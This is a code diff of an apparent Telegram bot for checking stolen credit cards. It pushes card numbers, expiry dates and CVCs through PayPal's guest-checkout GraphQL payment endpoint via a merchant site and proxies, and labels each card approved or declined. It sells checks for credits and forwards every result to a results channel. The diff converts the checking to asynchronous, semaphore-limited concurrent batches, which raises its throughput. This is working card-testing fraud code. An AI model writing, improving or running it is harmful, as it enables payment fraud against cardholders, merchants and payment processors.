-            'sec-fetch-dest': 'iframe',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': user,
-        }
-        params = {
-            'sessionID': session_id,
-            'buttonSessionID': button_session_id,
-            'locale.x': 'ar_EG',
-            'commit': 'true',
-            'hasShippingCallback': 'false',
-            'env': 'production',
-            'country.x': 'EG',
-            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
-            'disable-card': '',
-            'token': id,
-        }
-        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy_dict)
-
-        # Step 6: Submit payment
-        headers = {
-            'authority': 'my.tinyinstaller.top',
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'content-type': 'application/json',
-            'origin': 'https://my.tinyinstaller.top',
-            'referer': 'https://my.tinyinstaller.top/checkout/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user,
-        }
-        json_data = {
-            'query': '''
-                mutation payWithCard(
-                    $token: String!,
-                    $card: CardInput!,
-                    $phoneNumber: String,
-                    $firstName: String,
-                    $lastName: String,
-                    $shippingAddress: AddressInput,
-                    $billingAddress: AddressInput,
-                    $email: String,
-                    $currencyConversionType: CheckoutCurrencyConversionType,
-                    $installmentTerm: Int,
-                    $identityDocument: IdentityDocumentInput
-                ) {
-                    approveGuestPaymentWithCreditCard(
-                        token: $token,
-                        card: $card,
-                        phoneNumber: $phoneNumber,
-                        firstName: $firstName,
-                        lastName: $lastName,
-                        email: $email,
-                        shippingAddress: $shippingAddress,
-                        billingAddress: $billingAddress,
-                        currencyConversionType: $currencyConversionType,
-                        installmentTerm: $installmentTerm,
-                        identityDocument: $identityDocument
+            # Step 6: Submit payment
+            headers = {
+                'authority': 'my.tinyinstaller.top',
+                'accept': '*/*',
+                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+                'content-type': 'application/json',
+                'origin': 'https://my.tinyinstaller.top',
+                'referer': 'https://my.tinyinstaller.top/checkout/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user,
+            }
+            
+            json_data = {
+                'query': '''
+                    mutation payWithCard(
+                        $token: String!,
+                        $card: CardInput!,
+                        $phoneNumber: String,
+                        $firstName: String,
+                        $lastName: String,
+                        $shippingAddress: AddressInput,
+                        $billingAddress: AddressInput,
+                        $email: String,
+                        $currencyConversionType: CheckoutCurrencyConversionType,
+                        $installmentTerm: Int,
+                        $identityDocument: IdentityDocumentInput
                     ) {
-                        flags {
-                            is3DSecureRequired
-                        }
-                        cart {
-                            intent
-                            cartId
-                            buyer {
-                                userId
-                                auth {
-                                    accessToken
+                        approveGuestPaymentWithCreditCard(
+                            token: $token,
+                            card: $card,
+                            phoneNumber: $phoneNumber,
+                            firstName: $firstName,
+                            lastName: $lastName,
+                            email: $email,
+                            shippingAddress: $shippingAddress,
+                            billingAddress: $billingAddress,
+                            currencyConversionType: $currencyConversionType,
+                            installmentTerm: $installmentTerm,
+                            identityDocument: $identityDocument
+                        ) {
+                            flags {
+                                is3DSecureRequired
+                            }
+                            cart {
+                                intent
+                                cartId
+                                buyer {
+                                    userId
+                                    auth {
+                                        accessToken
+                                    }
                                 }
-                            }
-                            returnUrl {
-                                href
-                            }
-                        }
-                        paymentContingencies {
-                            threeDomainSecure {
-                                status
-                                method
-                                redirectUrl {
+                                returnUrl {
                                     href
                                 }
-                                parameter
+                            }
+                            paymentContingencies {
+                                threeDomainSecure {
+                                    status
+                                    method
+                                    redirectUrl {
+                                        href
+                                    }
+                                    parameter
+                                }
                             }
                         }
                     }
-                }
-            ''',
-            'variables': {
-                'token': id,
-                'card': {
-                    'cardNumber': n,
-                    'type': 'VISA',
-                    'expirationDate': mm + '/20' + yy,
-                    'postalCode': zip_code,
-                    'securityCode': cvc,
+                ''',
+                'variables': {
+                    'token': id,
+                    'card': {
+                        'cardNumber': n,
+                        'type': 'VISA',
+                        'expirationDate': mm + '/20' + yy,
+                        'postalCode': zip_code,
+                        'securityCode': cvc,
+                    },
+                    'phoneNumber': phone,
+                    'firstName': first_name,
+                    'lastName': last_name,
+                    'shippingAddress': {
+                        'givenName': first_name,
+                        'familyName': last_name,
+                        'line1': 'New York',
+                        'line2': None,
+                        'city': 'New York',
+                        'state': 'NY',
+                        'postalCode': '10080',
+                        'country': 'US',
+                    },
+                    'billingAddress': {
+                        'givenName': first_name,
+                        'familyName': last_name,
+                        'line1': 'New York',
+                        'line2': None,
+                        'city': 'New York',
+                        'state': 'NY',
+                        'postalCode': '10080',
+                        'country': 'US',
+                    },
+                    'email': acc,
+                    'currencyConversionType': 'VENDOR',
+                    'installmentTerm': None,
+                    'identityDocument': None
                 },
-                'phoneNumber': phone,
-                'firstName': first_name,
-                'lastName': last_name,
-                'shippingAddress': {
-                    'givenName': first_name,
-                    'familyName': last_name,
-                    'line1': 'New York',
-                    'line2': None,
-                    'city': 'New York',
-                    'state': 'NY',
-                    'postalCode': '10080',
-                    'country': 'US',
-                },
-                'billingAddress': {
-                    'givenName': first_name,
-                    'familyName': last_name,
-                    'line1': 'New York',
-                    'line2': None,
-                    'city': 'New York',
-                    'state': 'NY',
-                    'postalCode': '10080',
-                    'country': 'US',
-                },
-                'email': acc,
-                'currencyConversionType': 'VENDOR',
-                'installmentTerm': None,
-                'identityDocument': None
-            },
-            'operationName': 'payWithCard',
-        }
-        response = requests.post(
-            'https://www.paypal.com/graphql?fetch_credit_form_submit',
-            headers=headers,
-            json=json_data,
-            proxies=proxy_dict
-        )
-
-        last = response.text
-        appr = "APPROVED ✅"
-        decl = "DECLINED ❌"
-        bin_info = get_bin_info(n[:6])
+                'operationName': 'payWithCard',
+            }
+            
+            # Use aiohttp for final payment request
+            async with session.post(
+                'https://www.paypal.com/graphql?fetch_credit_form_submit',
+                headers=headers,
+                json=json_data,
+                proxy=proxy
+            ) as response:
+                last = await response.text()
+        
+        # Get BIN info asynchronously for better performance
+        bin_info = await get_bin_info_async(n[:6])
 
         elapsed_time = time.time() - start_time
 
@@ -938,13 +988,16 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        # Check if user already has an active check
-        if user_id in active_checks:
-            # Delete the message and ignore the request
-            try:
-                await update.message.delete()
-            except:
-                pass
+        # Enhanced concurrency control with per-user semaphores
+        if user_id not in user_semaphores:
+            user_semaphores[user_id] = asyncio.Semaphore(max_concurrent_per_user)
+        
+        # Check if user has too many active requests
+        if not user_semaphores[user_id].locked() and user_semaphores[user_id]._value <= 0:
+            await update.message.reply_text(
+                "⚠️ Too many concurrent requests. Please wait for your current checks to complete.",
+                parse_mode="HTML"
+            )
             return
 
         if context.user_data.get("state") != "check_cc":
@@ -1108,9 +1161,11 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'credits': db_user[3] - 1 if user_id != ADMIN_ID else float('inf')
             }
 
-            # Run CC check in executor to avoid blocking
-            loop = asyncio.get_event_loop()
-            result = await loop.run_in_executor(None, check_card, cc_line, None, user_info)
+            # Use semaphores to control concurrency
+            async with global_semaphore:
+                async with user_semaphores[user_id]:
+                    # Run CC check asynchronously for better performance
+                    result = await check_card_async(cc_line, None, user_info)
 
             # Stop message rotation
             rotation_active = False
@@ -1174,7 +1229,29 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
         active_checks.discard(user_id)
 
-# Function to check a single card with threading support
+# Synchronous wrapper for async card checking
+def check_card(cc_line, proxies=None, user_info=None):
+    """Synchronous wrapper for backward compatibility"""
+    try:
+        loop = asyncio.get_event_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    
+    return loop.run_until_complete(check_card_async(cc_line, proxies, user_info))
+
+# Function to check a single card with async support
+async def check_single_card_async(card_line, user_info):
+    """Async function to check a single card"""
+    try:
+        result = await check_card_async(card_line, None, user_info)
+        # Check if it's a valid/approved card
+        is_valid = "APPROVED ✅" in result
+        return result, is_valid
+    except Exception as e:
+        return f"❌ Error checking {card_line}: {str(e)}", False
+
+# Function to check a single card with threading support (for backward compatibility)
 def check_single_card_threaded(card_line, user_info):
     try:
         result = check_card(card_line, None, user_info)
@@ -1375,46 +1452,52 @@ async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'credits': (db_user[3] - len(valid_cards)) if user_id != ADMIN_ID else float('inf')
             }
 
-            # Use ThreadPoolExecutor for concurrent checking
-            loop = asyncio.get_event_loop()
-            
-            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-                # Submit all tasks
-                future_to_card = {executor.submit(check_single_card_threaded, card, user_info): card for card in valid_cards}
-                
-                for future in concurrent.futures.as_completed(future_to_card):
-                    try:
-                        result, is_valid = future.result()
-                        
-                        # Update stats
-                        with stats_lock:
-                            if user_id in check_stats:
-                                check_stats[user_id]['checked'] += 1
-                                if is_valid:
-                                    check_stats[user_id]['valid'] += 1
-                                else:
-                                    check_stats[user_id]['declined'] += 1
-                        
-                        # Update processing message with current stats (but don't interrupt rotation)
-                        stats = check_stats.get(user_id, {'total': 0, 'checked': 0, 'valid': 0, 'declined': 0})
-                        # Let the rotation continue, don't force update here to avoid conflicts
-                        
-                        # Send valid cards instantly to user
-                        if is_valid:
-                            await update.message.reply_text(result, parse_mode="HTML")
-                        
-                        # Send all results to results channel
+            # Use async semaphores for better concurrency control
+            async with global_semaphore:
+                async with user_semaphores[user_id]:
+                    # Create async tasks for concurrent checking
+                    tasks = []
+                    semaphore = asyncio.Semaphore(3)  # Limit concurrent card checks
+                    
+                    async def check_card_with_semaphore(card):
+                        async with semaphore:
+                            return await check_single_card_async(card, user_info)
+                    
+                    # Create tasks for all cards
+                    for card in valid_cards:
+                        task = asyncio.create_task(check_card_with_semaphore(card))
+                        tasks.append(task)
+                    
+                    # Process results as they complete
+                    for task in asyncio.as_completed(tasks):
                         try:
-                            await context.bot.send_message(chat_id=RESULTS_CHANNEL, text=result, parse_mode="HTML")
-                        except Exception as e:
-                            logger.warning(f"Failed to send to results channel: {str(e)}")
+                            result, is_valid = await task
                             
-                    except Exception as e:
-                        logger.error(f"Error processing card: {str(e)}")
-                        with stats_lock:
-                            if user_id in check_stats:
-                                check_stats[user_id]['checked'] += 1
-                                check_stats[user_id]['declined'] += 1
+                            # Update stats
+                            with stats_lock:
+                                if user_id in check_stats:
+                                    check_stats[user_id]['checked'] += 1
+                                    if is_valid:
+                                        check_stats[user_id]['valid'] += 1
+                                    else:
+                                        check_stats[user_id]['declined'] += 1
+                            
+                            # Send valid cards instantly to user
+                            if is_valid:
+                                await update.message.reply_text(result, parse_mode="HTML")
+                            
+                            # Send all results to results channel
+                            try:
+                                await context.bot.send_message(chat_id=RESULTS_CHANNEL, text=result, parse_mode="HTML")
+                            except Exception as e:
+                                logger.warning(f"Failed to send to results channel: {str(e)}")
+                                
+                        except Exception as e:
+                            logger.error(f"Error processing card: {str(e)}")
+                            with stats_lock:
+                                if user_id in check_stats:
+                                    check_stats[user_id]['checked'] += 1
+                                    check_stats[user_id]['declined'] += 1
 
             # Stop batch message rotation
             batch_rotation_active = False
